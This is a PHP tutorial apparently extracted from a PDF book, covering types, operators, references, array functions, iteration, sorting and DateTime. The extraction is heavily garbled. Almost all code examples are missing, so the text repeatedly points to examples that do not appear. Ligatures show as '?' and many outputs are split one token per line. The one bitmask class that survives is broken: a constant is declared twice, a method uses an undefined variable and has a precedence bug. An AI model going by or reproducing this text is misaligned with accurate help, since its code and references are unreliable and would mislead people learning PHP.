Callables are anything which can be called as a callback. Things that can be termed a "callback" are as follows: Anonymous functions
Standard PHP functions (note: not language constructs)
Static Classes
non-static Classes (using an alternate syntax) Speci?c Object/Class Methods
Objects themselves, as long as the object is found in key 0 of an array

Example Of referencing an object as an array element:



Callbacks can be denoted by callable type hint as of PHP 5.4.


Section 9.6: Resources
A resource is a special type of variable that references an external resource, such as a ?le, socket, stream, document, or connection.


There are di?erent (sub-)types of resource. You can check the resource type using get_resource_type():




You can ?nd a complete list of built-in resource types here.

Section 9.7: Type Casting
PHP will generally correctly guess the data type you intend to use from the context it's used in, however sometimes it is useful to manually force a type. This can be accomplished by pre?xing the declaration with the name of the required type in parenthesis:


But be careful: not all type casts work as one might expect:


Section 9.8: Type Juggling
PHP is a weakly-typed language. It does not require explicit declaration of data types. The context in which the variable is used determines its data type; conversion is done automatically:




Section 9.9: Null
PHP represents "no value" with the null keyword. It's somewhat similar to the null pointer in C-language and to the NULL value in SQL.

Setting the variable to null:


Checking if the variable was set to null:

Null vs unde?ned variable

If the variable was not de?ned or was unset then any tests against the null will be successful but they will also generate a Notice: Undefined variable: nullvar:


Therefore unde?ned values must be checked with isset:


Section 9.10: Integers
Integers in PHP can be natively speci?ed in base 2 (binary), base 8 (octal), base 10 (decimal), or base 16 (hexadecimal.)


Integers are 32 or 64 bits long, depending on the platform. The constant PHP_INT_SIZE holds integer size in bytes.
PHP_INT_MAX and (since PHP 7.0) PHP_INT_MIN are also available.


Integer values are automatically created as needed from ?oats, booleans, and strings. If an explicit typecast is

needed, it can be done with the (int) or (integer) cast:


Integer over?ow will be handled by conversion to a ?oat:


There is no integer division operator in PHP, but it can be simulated using an implicit cast, which always 'rounds' by just discarding the ?oat-part. As of PHP version 7, an integer division function was added.


(Note that the extra parentheses around (25 / 4) are needed because the (int) cast has higher precedence than the division)

Chapter 10: Operators
An operator is something that takes one or more values (or expressions, in programming jargon) and yields another value (so that the construction itself becomes an expression).
Operators can be grouped according to the number of values they take.

Section 10.1: Null Coalescing Operator (??)
Null coalescing is a new operator introduced in PHP 7. This operator returns its ?rst operand if it is set and not
NULL. Otherwise it will return its second operand. The following example:


is equivalent to both:


and:


This operator can also be chained (with right-associative semantics):


which is an equivalent to:


Note:
When using coalescing operator on string concatenation don't forget to use parentheses ()


This will output John only, and if its $?rstName is null and $lastName is Doe it will output Unknown Doe. In order to output John Doe, we must use parentheses like this.




This will output John Doe instead of John only.
Section 10.2: Spaceship Operator (<=>)
PHP 7 introduces a new kind of operator, which can be used to compare expressions. This operator will return -1, 0 or 1 if the ?rst expression is less than, equal to, or greater than the second expression.


Objects are not comparable, and so doing so will result in unde?ned behaviour.

This operator is particularly useful when writing a user-de?ned comparison function using usort, uasort, or uksort. Given an array of objects to be sorted by their weight property, for example, an anonymous function can use <=> to return the value expected by the sorting functions.


In PHP 5 this would have required a rather more elaborate expression.


Section 10.3: Execution Operator (``)
The PHP execution operator consists of backticks (``) and is used to run shell commands. The output of the command will be returned, and may, therefore, be stored in a variable.


Note that the execute operator and shell_exec() will give the same result.

Section 10.4: Incrementing (++) and Decrementing Operators (--)
Variables can be incremented or decremented by 1 with ++ or --, respectively. They can either precede or succeed variables and slightly vary semantically, as shown below.



More information about incrementing and decrementing operators can be found in the o?cial documentation.

Section 10.5: Ternary Operator (?:)
The ternary operator can be thought of as an inline if statement. It consists of three parts. The operator, and two outcomes. The syntax is as follows:


If the operator is evaluated as true, the value in the ?rst block will be returned (<true value>), else the value in the second block will be returned (<false value>). Since we are setting $value to the result of our ternary operator it will store the returned value.

Example:


$action would contain the string 'default' if empty($_POST['action']) evaluates to true. Otherwise it would contain the value of $_POST['action'].
The expression (expr1) ? (expr2) : (expr3) evaluates to expr2 if expr1evaluates to true, and expr3 if expr1
evaluates to false.

It is possible to leave out the middle part of the ternary operator. Expression expr1 ?: expr3 returns expr1 if expr1
evaluates to TRUE, and expr3 otherwise. ?: is often referred to as Elvis operator.

This behaves like the Null Coalescing operator ??, except that ?? requires the left operand to be exactly null while
?: tries to resolve the left operand into a boolean and check if it resolves to boolean false. Example:


In this example, setWidth accepts a width parameter, or default 0, to change the width session value. If $width is 0 (if $width is not provided), which will resolve to boolean false, the value of getDefaultWidth() is used instead. The getDefaultWidth() function will not be called if $width did not resolve to boolean false.

Refer to Types for more information about conversion of variables to boolean.

Section 10.6: Logical Operators (&&/AND and ||/OR)
In PHP, there are two versions of logical AND and OR operators.

Operator	True if
$a and $b Both $a and $b are true
$a && $b Both $a and $b are true
$a or $b Either $a or $b is true
$a || $b Either $a or $b is true

Note that the && and || opererators have higher precedence than and and or. See table below:

Evaluation	Result of $e	Evaluated as
$e = false || true True	$e = (false || true)
$e = false or true False	($e = false) or true

Because of this it's safer to use && and || instead of and and or.
Section 10.7: String Operators (. and .=)
There are only two string operators: Concatenation of two strings (dot):

Concatenating assignment (dot=):


Section 10.8: Object and Class Operators
Members of objects or classes can be accessed using the object operator (->) and the class operator (::).




Note that after the object operator, the $ should not be written ($object->a instead of $object->$a). For the class operator, this is not the case and the $ is necessary. For a constant de?ned in the class, the $ is never used.
Also note that var_dump(MyClass::d()); is only allowed if the function d() does not reference the object:


This causes a 'PHP Fatal error: Uncaught Error: Using $this when not in object context'

These operators have left associativity, which can be used for 'chaining':


These operators have the highest precedence (they are not even mentioned in the manual), even higher that clone. Thus:


The value of $o1 is added to before the object is cloned!

Note that using parentheses to in?uence precedence did not work in PHP version 5 and older (it does in PHP 7):



Section 10.9: Combined Assignment (+= etc)
The combined assignment operators are a shortcut for an operation on some variable and subsequently assigning this new value to that variable.
Arithmetic:


Processing Multiple Arrays Together


Combined concatenation and assignment of a string:


Combined binary bitwise assignment operators:


$a
= 0b00101010;
//
$a
now
is
42

$a
&= 0b00001111;
//
$a
now
is
(00101010
&
00001111)
=>
00001010
(bitwise
and)
$a
|= 0b00100010;
//
$a
now
is
(00001010
|
00100010)
=>
00101010
(bitwise
or)
$a
^= 0b10000010;
//
$a
now
is
(00101010
^
10000010)
=>
10101000
(bitwise
xor)


Section 10.10: Altering operator precedence (with parentheses)
The order in which operators are evaluated is determined by the operator precedence (see also the Remarks section).

In


$a gets a value of 10 because 2 * 3 is evaluated ?rst (multiplication has a higher precedence than addition) yielding
a sub-result of 6 + 4, which equals to 10.

The precedence can be altered using parentheses: in


$a gets a value of 14 because (3 + 4) is evaluated ?rst.
Section 10.11: Basic Assignment (=)


results in $a having the value some string.

The result of an assignment expression is the value being assigned. Note that a single equal sign = is NOT for comparison!


does the following:

1. Line 1 assigns 3 to $a.
2. Line 2 assigns 5 to $a. This expression yields value 5 as well.
3. Line 2 then assigns the result of the expression in parentheses (5) to $b.

Thus: both $a and $b now have value 5.
Section 10.12: Association
Left association

If the preceedence of two operators is equal, the associativity determines the grouping (see also the Remarks section):


* and % have equal precedence and left associativity. Because the multiplication occurs ?rst (left), it is grouped.


Now, the modulus operator occurs ?rst (left) and is thus grouped.

Right association

Both $a and $b now have value 2 because $b += 1 is grouped and then the result ($b is 2) is assigned to $a.
Section 10.13: Comparison Operators
Equality

For basic equality testing, the equal operator == is used. For more comprehensive checks, use the identical operator
===.

The identical operator works the same as the equal operator, requiring its operands have the same value, but also requires them to have the same data type.
For example, the sample below will display 'a and b are equal', but not 'a and b are identical'.


When using the equal operator, numeric strings are cast to integers.

Comparison of objects

=== compares two objects by checking if they are exactly the same instance. This means that new stdClass() ===
new stdClass() resolves to false, even if they are created in the same way (and have the exactly same values).

== compares two objects by recursively checking if they are equal (deep equals). That means, for $a == $b, if $a and
$b are:

1. of the same class
2. have the same properties set, including dynamic properties
3. for each property $property set, $a->property == $b->property is true (hence recursively checked).

Other commonly used operators

They include:

1. Greater Than (>)
2. Lesser Than (<)
3. Greater Than Or Equal To (>=)
4. Lesser Than Or Equal To (<=)
5. Not Equal To (!=)
6. Not Identically Equal To (!==)
1. Greater Than: $a > $b, returns true if $a's value is greater than of $b, otherwise returns false.

Example:


2. Lesser Than: $a < $b, returns true if $a's value is smaller that of $b, otherwise returns false.

Example:


3. Greater Than Or Equal To: $a >= $b, returns true if $a's value is either greater than of $b or equal to $b, otherwise returns false.

Example:


4. Smaller Than Or Equal To: $a <= $b, returns true if $a's value is either smaller than of $b or equal to $b, otherwise returns false.

Example:


5/6. Not Equal/Identical To: To rehash the earlier example on equality, the sample below will display 'a and b are not identical', but not 'a and b are not equal'.


Section 10.14: Bitwise Operators
Pre?x bitwise operators

Bitwise operators are like logical operators but executed per bit rather than per boolean value.

Bitmask-bitmask operators

Bitwise AND &: a bit is set only if it is set in both operands


Bitwise OR |: a bit is set if it is set in either or both operands


Bitwise XOR ^: a bit is set if it is set in one operand and not set in another operand, i.e. only if that bit is in di?erent state in the two operands


Example uses of bitmasks

These operators can be used to manipulate bitmasks. For example:


Here, the | operator is used to combine the two bitmasks. Although + has the same e?ect, | emphasizes that you

are combining bitmasks, not adding two normal scalar integers.

class Foo{
const OPTION_A = 1; const OPTION_B = 2; const OPTION_C = 4; const OPTION_A = 8;
private $options = self::OPTION_A | self::OPTION_C; public function toggleOption(int $option){
$this->options ^= $option;
}

public function enable(int $option){
$this->options |= $option; // enable $option regardless of its original state
}

public function disable(int $option){
$this->options &= ~$option; // disable $option regardless of its original state,
// without affecting other bits
}

/** returns whether at least one of the options is enabled */
public function isOneEnabled(int $options) : bool{ return $this->options & $option !== 0;
// Use !== rather than >, because
// if $options is about a high bit, we may be handling a negative integer
}

/** returns whether all of the options are enabled */
public function areAllEnabled(int $options) : bool{ return ($this->options & $options) === $options;
// note the parentheses; beware the operator precedence
}
}

This example (assuming $option always only contain one bit) uses:

the ^ operator to conveniently toggle bitmasks.
the | operator to set a bit neglecting its original state or other bits
the ~ operator to convert an integer with only one bit set into an integer with only one bit not set the & operator to unset a bit, using these properties of &:
Since &= with a set bit will not do anything ((1 & 1) === 1, (0 & 1) === 0), doing &= with an integer with only one bit not set will only unset that bit, not a?ecting other bits.
&= with an unset bit will unset that bit ((1 & 0) === 0, (0 & 0) === 0)
Using the & operator with another bitmask will ?lter away all other bits not set in that bitmask.
If the output has any bits set, it means that any one of the options are enabled.
If the output has all bits of the bitmask set, it means that all of the options in the bitmask are enabled.

Bear in mind that these comparison operators: (< > <= >= == === != !== <> <=>) have higher precedence than these bitmask-bitmask operators: (| ^ &). As bitwise results are often compared using these comparison operators, this is a common pitfall to be aware of.

Bit-shifting operators

Bitwise left shift <<: shift all bits to the left (more signi?cant) by the given number of steps and discard the bits exceeding the int size

<< $x is equivalent to unsetting the highest $x bits and multiplying by the $xth power of 2


Bitwise right shift >>: discard the lowest shift and shift the remaining bits to the right (less signi?cant)

>> $x is equivalent to dividing by the $xth power of 2 and discard the non-integer part


Example uses of bit shifting:

Fast division by 16 (better performance than /= 16)


On 32-bit systems, this discards all bits in the integer, setting the value to 0. On 64-bit systems, this unsets the most signi?cant 32 bits and keep the least


signi?cant 32 bits, equivalent to $x & 0xFFFFFFFF

Note: In this example, printf("%'06b") is used. It outputs the value in 6 binary digits.
Section 10.15: instanceof (type operator)
For checking whether some object is of a certain class, the (binary) instanceof operator can be used since PHP version 5.

The ?rst (left) parameter is the object to test. If this variable is not an object, instanceof always returns false. If a constant expression is used, an error is thrown.

The second (right) parameter is the class to compare with. The class can be provided as the class name itself, a string variable containing the class name (not a string constant!) or an object of that class.


instanceof can also be used to check whether an object is of some class which extends another class or implements some interface:


To check whether an object is not of some class, the not operator (!) can be used:


Note that parentheses around $o instanceof MyClass are not needed because instanceof has higher precedence than !, although it may make the code better readable with parentheses.

Caveats

If a class does not exist, the registered autoload functions are called to try to de?ne the class (this is a topic outside the scope of this part of the Documentation!). In PHP versions before 5.1.0, the instanceof operator would also trigger these calls, thus actually de?ning the class (and if the class could not be de?ned, a fatal error would occur). To avoid this, use a string:


As of PHP version 5.1.0, the registered autoloaders are not called anymore in these situations.

Older versions of PHP (before 5.0)

In older versions of PHP (before 5.0), the is_a function can be used to determine wether an object is of some class. This function was deprecated in PHP version 5 and undeprecated in PHP version 5.3.0.

Chapter 11: References
Section 11.1: Assign by Reference
This is the ?rst phase of referencing. Essentially when you assign by reference, you're allowing two variables to share the same value as such.


$foo and $bar are equal here. They do not point to one another. They point to the same place (the "value").

You can also assign by reference within the array() language construct. While not strictly being an assignment by reference.



Note, however, that references inside arrays are potentially dangerous. Doing a normal (not by reference) assignment with a reference on the right side does not turn the left side into a reference, but references inside arrays are preserved in these normal assignments. This also applies to function calls where the array is passed by value.

Assigning by reference is not only limited to variables and arrays, they are also present for functions and all "pass- by-reference" associations.


Assignment is key within the function de?nition as above. You can not pass an expression by reference, only a value/variable. Hence the instantiation of $a in bar().
Section 11.2: Return by Reference
Occasionally there comes time for you to implicitly return-by-reference.

Returning by reference is useful when you want to use a function to ?nd to which variable a reference should be bound. Do not use return-by-reference to increase performance. The engine will automatically optimize this on its own. Only return references when you have a valid technical reason to do so.

Taken from the PHP Documentation for Returning By Reference.

There are many di?erent forms return by reference can take, including the following example:


Return by reference is not only limited to function references. You also have the ability to implicitly call the function:


You cannot directly reference a function call, it has to be assigned to a variable before harnessing it. To see how that works, simply try echo &myFunction();.



Notes










You are required to specify a reference (&) in both places you intend on using it. That means, for your function de?nition (function &myFunction() {...) and in the calling reference (function callFunction(&$variable) {... or &myFunction();).
You can only return a variable by reference. Hence the instantiation of $a in the example above. This means you can not return an expression, otherwise an E_NOTICE PHP error will be generated (Notice: Only variable references should be returned by reference in 	).
Return by reference does have legitimate use cases, but I should warn that they should be used sparingly, only after exploring all other potential options of achieving the same goal.

Section 11.3: Pass by Reference
This allows you to pass a variable by reference to a function or element that allows you to modify the original variable.
Passing-by-reference is not limited to variables only, the following can also be passed by reference:

New statements, e.g. foo(new SomeClass)
References returned from functions


Arrays

A common use of "passing-by-reference" is to modify initial values within an array without going to the extent of

creating new arrays or littering your namespace. Passing-by-reference is as simple as preceding/pre?xing the variable with an & => &$myElement.
Below is an example of harnessing an element from an array and simply adding 1 to its initial value.


Now when you harness any element within $arr, the original element will be updated as the reference was increased. You can verify this by:



Note

You should take note when harnessing pass by reference within loops. At the end of the above loop, $num still holds a reference to the last element of the array. Assigning it post loop will end up manipulating the last array element! You can ensure this doesn't happen by unset()'ing it post-loop:


The above will ensure you don't run into any issues. An example of issues that could relate from this is present in this question on StackOver?ow.



Functions

Another common usage for passing-by-reference is within functions. Modifying the original variable is as simple as:


Which can be veri?ed by echo'ing the original variable.


There are various restrictions around functions, as noted below from the PHP docs:

Note: There is no reference sign on a function call - only on function de?nitions. Function de?nitions alone are enough to correctly pass the argument by reference. As of PHP 5.3.0, you will get a warning

saying that "call-time pass-by-reference" is deprecated when you use & in foo(&$a);. And as of PHP 5.4.0, call-time pass-by-reference was removed, so using it will raise a fatal error.

Chapter 12: Arrays
Parameter	Detail
The key is the unique identi?er and index of an array. It may be a string or an integer. Therefore, valid keys would be 'foo', '5', 10, 'a2b', ...
For each key there is a corresponding value (null otherwise and a notice is emitted upon access). The value has no restrictions on the input type.

An array is a data structure that stores an arbitrary number of values in a single value. An array in PHP is actually an ordered map, where map is a type that associates values to keys.
Section 12.1: Initializing an Array
An array can be initialized empty:



An array can be initialized and preset with values:



An array can also be initialized with custom indexes (also called an associative array):



If the variable hasn't been used before, PHP will create it automatically. While convenient, this might make the code harder to read:





The index will usually continue where you left o?. PHP will try to use numeric strings as integers:



To initialize an array with ?xed size you can use SplFixedArray:


Note: An array created using SplFixedArray has a reduced memory footprint for large sets of data, but the keys must be integers.


To initialize an array with a dynamic size but with n non empty elements (e.g. a placeholder) you can use a loop as follows:



If all your placeholders are the same then you can also create it using the function array_fill(): array array_?ll ( int $start_index , int $num , mixed $value )
This creates and returns an array with num entries of value, keys starting at start_index.

Note: If the start_index is negative it will start with the negative index and continue from 0 for the following elements.


Conclusion: With array_fill() you are more limited for what you can actually do. The loop is more ?exible and

opens you a wider range of opportunities.

Whenever you want an array ?lled with a range of numbers (e.g. 1-4) you could either append every single element to an array or use the range() function:
array range ( mixed $start , mixed $end [, number $step = 1 ] )

This function creates an array containing a range of elements. The ?rst two parameters are required, where they set the start and end points of the (inclusive) range. The third parameter is optional and de?nes the size of the steps being taken. Creating a range from 0 to 4 with a stepsize of 1, the resulting array would consist of the following elements: 0, 1, 2, 3, and 4. If the step size is increased to 2 (i.e. range(0, 4, 2)) then the resulting array
would be: 0, 2, and 4.


range can work with integers, ?oats, booleans (which become casted to integers), and strings. Caution should be taken, however, when using ?oats as arguments due to the ?oating point precision problem.
Section 12.2: Check if key exists
Use array_key_exists() or isset() or !empty():


Note that isset() treats a null valued element as non-existent. Whereas !empty() does the same for any element that equals false (using a weak comparision; for example, null, '' and 0 are all treated as false by !empty()).
While isset($map['foobar']); is true, !empty($map['foobar']) is false. This can lead to mistakes (for example, it is easy to forget that the string '0' is treated as false) so use of !empty() is often frowned upon.
Note also that isset() and !empty() will work (and return false) if $map is not de?ned at all. This makes them somewhat error-prone to use:


You can also check for ordinal arrays:


Note that isset() has better performance than array_key_exists() as the latter is a function and the former a language construct.

You can also use key_exists(), which is an alias for array_key_exists().
Section 12.3: Validating the array type
The function is_array() returns true if a variable is an array.


You can type hint the array type in a function to enforce a parameter type; passing anything else will result in a fatal error.


You can also use the gettype() function.


Section 12.4: Creating an array of variables


This method is often used in frameworks to pass an array of variables between two components.

Section 12.5: Checking if a value exists in array
The function in_array() returns true if an item exists in an array.




You can also use the function array_search() to get the key of a speci?c item in an array.

PHP 5.x Version = 5.5

In PHP 5.5 and later you can use array_column() in conjunction with array_search(). This is particularly useful for checking if a value exists in an associative array:


Section 12.6: ArrayAccess and Iterator Interfaces
Another useful feature is accessing your custom object collections as arrays in PHP. There are two interfaces available in PHP (>=5.0.0) core to support this: ArrayAccess and Iterator. The former allows you to access your custom objects as array.

ArrayAccess

Assume we have a user class and a database table storing all the users. We would like to create a UserCollection
class that will:

1. allow us to address certain user by their username unique identi?er
2. perform basic (not all CRUD, but at least Create, Retrieve and Delete) operations on our users collection

Consider the following source (hereinafter we're using short array creation syntax [] available since version 5.4):


$connectionParams = [
//your connection to the database
];

$this->_conn = DriverManager::getConnection($connectionParams, $config);
}

protected function _getByUsername($username) {
$ret = $this->_conn->executeQuery('SELECT * FROM `User` WHERE `username` IN (?)', [$username]
)->fetch();

return $ret;
}

// START of methods required by ArrayAccess interface
public function offsetExists($offset) {
return (bool) $this->_getByUsername($offset);
}

public function offsetGet($offset) { return $this->_getByUsername($offset);
}

public function offsetSet($offset, $value) { if (!is_array($value)) {
throw new \Exception('value must be an Array');
}

$passed = array_intersect(array_values($this->_requiredParams), array_keys($value)); if (count($passed) < count($this->_requiredParams)) {
              throw new \Exception('value must contain at least the following params: ' . implode(',', $this->_requiredParams));
}
$this->_conn->insert('User', $value);
}

public function offsetUnset($offset) { if (!is_string($offset)) {
throw new \Exception('value must be the username to delete');
}
if (!$this->offsetGet($offset)) {
throw new \Exception('user not found');
}
$this->_conn->delete('User', ['username' => $offset]);
}
// END of methods required by ArrayAccess interface
}

then we can:


which will output the following, assuming there was no testuser before we launched the code:


IMPORTANT: offsetExists is not called when you check existence of a key with array_key_exists function. So the following code will output false twice:


Iterator

Let's extend our class from above with a few functions from Iterator interface to allow iterating over it with
foreach and while.

First, we need to add a property holding our current index of iterator, let's add it to the class properties as
$_position:


Second, let's add Iterator interface to the list of interfaces being implemented by our class:


then add the required by the interface functions themselves:




So all in all here is complete source of the class implementing both interfaces. Note that this example is not perfect, because the IDs in the database may not be sequential, but this was written just to give you the main idea: you can address your objects collections in any possible way by implementing ArrayAccess and Iterator interfaces:


and a foreach looping through all user objects:


which will output something like


Chapter 13: Array iteration
Section 13.1: Iterating multiple arrays together
Sometimes two arrays of the same length need to be iterated together, for example:


array_map is the simplest way to accomplish this:


which will output:


This can be done through a common index:


If the two arrays don't have the incremental keys, array_values($array)[$i] can be used to replace $array[$i]. If both arrays have the same order of keys, you can also use a foreach-with-key loop on one of the arrays:


Separate arrays can only be looped through if they are the same length and also have the same key name. This means if you don't supply a key and they are numbered, you will be ?ne, or if you name the keys and put them in the same order in each array.
You can also use array_combine.


Then you can loop through this by doing the same as before:


Section 13.2: Using an incremental index
This method works by incrementing an integer from 0 to the greatest index in the array.


This also allows iterating an array in reverse order without using array_reverse, which may result in overhead if the array is large.


You can skip or rewind the index easily using this method.


Output:


For arrays that do not have incremental indices (including arrays with indices in reverse order, e.g. [1 => "foo", 0
=> "bar"], ["foo" => "f", "bar" => "b"]), this cannot be done directly. array_values or array_keys can be used instead:


Section 13.3: Using internal array pointers
Each array instance contains an internal pointer. By manipulating this pointer, di?erent elements of an array can be retrieved from the same call at di?erent times.
Using each

Each call to each() returns the key and value of the current array element, and increments the internal array pointer.

Using next


Note that this example assumes no elements in the array are identical to boolean false. To prevent such assumption, use key to check if the internal pointer has reached the end of the array:


This also facilitates iterating an array without a direct loop:


Section 13.4: Using foreach
Direct loop
Loop with keys

Loop by reference

In the foreach loops in the above examples, modifying the value ($color or $food) directly doesn't change its value in the array. The & operator is required so that the value is a reference pointer to the element in the array.




This is similar to:


Concurrency

PHP arrays can be modi?ed in any ways during iteration without concurrency problems (unlike e.g. Java Lists). If the array is iterated by reference, later iterations will be a?ected by changes to the array. Otherwise, the changes to the array will not a?ect later iterations (as if you are iterating a copy of the array instead). Compare looping by value:


Output:


But if the array is iterated with reference,


Output:


0
=>
1
2
=>
3
6
=>
17

The key-value set of 4 => 5 is no longer iterated, and 6 => 7 is changed to 6 => 17.

Section 13.5: Using ArrayObject Iterator
Php arrayiterator allows you to modify and unset the values while iterating over arrays and objects. Example:


Output:


Chapter 14: Executing Upon an Array
Section 14.1: Applying a function to each element of an array
To apply a function to every item in an array, use array_map(). This will return a new array.


$newArray now is array(2,3,4,5,6);.

Instead of using an anonymous function, you could use a named function. The above could be written like:


If the named function is a class method the call of the function has to include a reference to a class object the method belongs to:


Another way to apply a function to every item in an array is array_walk() and array_walk_recursive(). The callback passed into these functions take both the key/index and value of each array item. These functions will not return a new array, instead a boolean for success. For example, to print every element in a simple array:


The value parameter of the callback may be passed by reference, allowing you to change the value directly in the original array:


$array now is array(2,3,4,5,6);

For nested arrays, array_walk_recursive() will go deeper into each sub-array:


Note: array_walk and array_walk_recursive let you change the value of array items, but not the keys. Passing the keys by reference into the callback is valid but has no e?ect.
Section 14.2: Split array into chunks
array_chunk() splits an array into chunks

Let's say we've following single dimensional array,


Now using array_chunk() on above PHP array,


Above code will make chunks of 2 array elements and create a multidimensional array as follow.


If all the elements of the array is not evenly divided by the chunk size, last element of the output array will be remaining elements.
If we pass second argument as less then 1 then E_WARNING will be thrown and output array will be NULL. Parameter	Details
$array (array)	Input array, the array to work on
$size (int)	Size of each chunk ( Integer value)
$preserve_keys (boolean) (optional) If you want output array to preserve the keys set it to TRUE otherwise FALSE.

Section 14.3: Imploding an array into string
implode() combines all the array values but looses all the key info:


Imploding keys can be done using array_keys() call:


Imploding keys with values is more complex but can be done using functional style:


Section 14.4: "Destructuring" arrays using list()
Use list() to quick assign a list of variable values into an array. See also compact()


With PHP 7.1 (currently in beta) you will be able to use short list syntax:


Section 14.5: array_reduce
array_reduce reduces array into a single value. Basically, The array_reduce will go through every item with the result from last iteration and produce new value to the next iteration.

Usage: array_reduce ($array, function($carry, $item){...}, $defaul_value_of_first_carry)

$carry is the result from the last round of iteration.
$item is the value of current position in the array.

Sum of array




result:15

The largest number in array


result:211

Is all item more than 100


result:true

Is any item less than 100


result:true

Like implode($array, $piece)


result:"hello-world-PHP-language"

if make a implode method, the source code will be:


result:"hello-world-PHP-language"
Section 14.6: Push a Value on an Array
There are two ways to push an element to an array: array_push and $array[] =

The array_push is used like this:




This code will print:


$array[] = is used like this:


This code will print:


Chapter 15: Manipulating an Array
Section 15.1: Filtering an array
In order to ?lter out values from an array and obtain a new array containing all the values that satisfy the ?lter condition, you can use the array_filter function.
Filtering non-empty values

The simplest case of ?ltering is to remove all "empty" values:

Filtering by callback

This time we de?ne our own ?ltering rule. Suppose we want to get only even numbers:


The array_filter function receives the array to be ?ltered as its ?rst argument, and a callback de?ning the ?lter predicate as its second.
Version = 5.6
Filtering by index

A third parameter can be provided to the array_filter function, which allows to tweak which values are passed to the callback. This parameter can be set to either ARRAY_FILTER_USE_KEY or ARRAY_FILTER_USE_BOTH, which will result in the callback receiving the key instead of the value for each element in the array, or both value and key as its arguments. For example, if you want to deal with indexes istead of values:

Indexes in ?ltered array

Note that array_filter preserves the original array keys. A common mistake would be to try an use for loop over the ?ltered array:




This happens because the values which were on positions 1 (there was 0), 3 (null), 5 (empty string '') and 7 (empty array []) were removed along with their corresponding index keys.
If you need to loop through the result of a ?lter on an indexed array, you should ?rst call array_values on the result of array_filter in order to create a new array with the correct indexes:


Section 15.2: Removing elements from an array
To remove an element inside an array, e.g. the element with the index 1.


This will remove the apples from the list, but notice that unset does not change the indexes of the remaining elements. So $fruit now contains the indexes 0 and 2.
For associative array you can remove like this:


Now $fruit is



Note that


unsets the variable and thus removes the whole array, meaning none of its elements are accessible anymore.

Removing terminal elements
array_shift() - Shift an element o? the beginning of array. Example:


Output:


array_pop() - Pop the element o? the end of array.

Example:


Output:


Section 15.3: Sorting an Array
There are several sort functions for arrays in php:

sort()

Sort an array in ascending order by value.



results in




[0]
=>
Apfel
[1]
=>
Banane
[2]
=>
Orange
[3]
=>
Zitrone
rsort()

Sort an array in descending order by value.


results in




[0]
=>
Zitrone
[1]
=>
Orange
[2]
=>
Banane
[3]
=>
Apfel
asort()

Sort an array in ascending order by value and preserve the indices.


results in




[4]
=>
apple
[3]
=>
banana
[1]
=>
lemon
[2]
=>
orange
arsort()

Sort an array in descending order by value and preserve the indices.


results in




[2]
=>
orange
[1]
=>
lemon
[3]
=>
banana
[4]
=>
apple
ksort()

Sort an array in ascending order by key


results in

krsort()

Sort an array in descending order by key.


results in

natsort()

Sort an array in a way a human being would do (natural order).


results in




[4]
=>
File2.stack
[0]
=>
File8.stack
[2]
=>
file7.stack
[3]
=>
file13.stack

natcasesort()

Sort an array in a way a human being would do (natural order), but case intensive


results in




[4]
=>
File2.stack
[2]
=>
file7.stack
[0]
=>
File8.stack
[3]
=>
file13.stack
[1]
=>
file77.stack
shu?e()

Shu?es an array (sorted randomly).


As written in the description it is random so here only one example in what it can result

usort()

Sort an array with a user de?ned comparison function.


results in



uasort()

Sort an array with a user de?ned comparison function and preserve the keys.


results in




[e]
=>
-5
[b]
=>
-3
[a]
=>
1
[d]
=>
3
[c]
=>
5
uksort()

Sort an array by keys with a user de?ned comparison function.


results in


Section 15.4: Whitelist only some array keys
When you want to allow only certain keys in your arrays, especially when the array comes from request parameters, you can use array_intersect_key together with array_flip.


If the parameters variable doesn't contain any allowed key, then the filteredParameters variable will consist of an empty array.

Since PHP 5.6 you can use array_filter for this task too, passing the ARRAY_FILTER_USE_KEY ?ag as the third parameter:


Using array_filter gives the additional ?exibility of performing an arbitrary test against the key, e.g. $allowedKeys could contain regex patterns instead of plain strings. It also more explicitly states the intention of the code than array_intersect_key() combined with array_flip().
Section 15.5: Adding element to start of array
Sometimes you want to add an element to the beginning of an array without modifying any of the current elements (order) within the array. Whenever this is the case, you can use array_unshift().

array_unshift() prepends passed elements to the front of the array. Note that the list of elements is prepended as a whole, so that the prepended elements stay in the same order. All numerical array keys will be modi?ed to start counting from zero while literal keys won't be touched.

Taken from the PHP documentation for array_unshift().

If you'd like to achieve this, all you need to do is the following:


This will now add 4 as the ?rst element in your array. You can verify this by:


This returns an array in the following order: 4, 1, 2, 3.

Since array_unshift forces the array to reset the key-value pairs as the new element let the following entries have the keys n+1 it is smarter to create a new array and append the existing array to the newly created array.
Example:


Output ($joinedArray):


Eaxmple/Demo

Section 15.6: Exchange values with keys
array_flip function will exchange all keys with its elements.


Section 15.7: Merge two arrays into one array


Associative array:


1. Merges the elements of one or more arrays together so that the values of one are appended to the end of

the previous one. It returns the resulting array.
2. If the input arrays have the same string keys, then the later value for that key will overwrite the previous one. If, however, the arrays contain numeric keys, the later value will not overwrite the original value, but will be appended.
3. Values in the input array with numeric keys will be renumbered with incrementing keys starting from zero in the result array.

Chapter 16: Processing Multiple Arrays Together
Section 16.1: Array intersection
The array_intersect function will return an array of values that exist in all arrays that were passed to this function.


Array keys are preserved. Indexes from the original arrays are not.

array_intersect only check the values of the arrays. array_intersect_assoc function will return intersection of arrays with keys.


array_intersect_key function only check the intersection of keys. It will returns keys exist in all arrays.


Section 16.2: Merge or concatenate arrays


Note that array_merge will change numeric indexes, but overwrite string indexes


array_merge overwrites the values of the ?rst array with the values of the second array, if it cannot renumber the index.

You can use the + operator to merge two arrays in a way that the values of the ?rst array never get overwritten, but

it does not renumber numeric indexes, so you lose values of arrays that have an index that is also used in the ?rst array.


Section 16.3: Changing a multidimensional array to associative array
If you have a multidimensional array like this:


And you want to change it to an associative array like this:


You can use this code:


Or, you can skip setting $associativeArrayKeys and $associativeArrayValues and use this simple one liner:


Section 16.4: Combining two arrays (keys from one, values from another)
The following example shows how to merge two arrays into one associative array, where the key values will be the items of the ?rst array, and the values will be from the second:




Chapter 17: Datetime Class
Section 17.1: Create Immutable version of DateTime from Mutable prior PHP 5.6
To create \DateTimeImmutable in PHP 5.6+ use:


Prior PHP 5.6 you can use:


Section 17.2: Add or Subtract Date Intervals
We can use the class DateInterval to add or subtract some interval in a DateTime object.

See the example below, where we are adding an interval of 7 days and printing a message on the screen:


This will output (running on Aug 1st, 2016):

Samara says: Seven Days. You'll be happy on 2016-08-08.


We can use the sub method in a similar way to subtract dates


This will output (running on Aug 1st, 2016):

Samara says: Seven Days. You were happy last on 2016-07-25.

Section 17.3: getTimestamp
getTimeStemp is a unix representation of a datetime object.


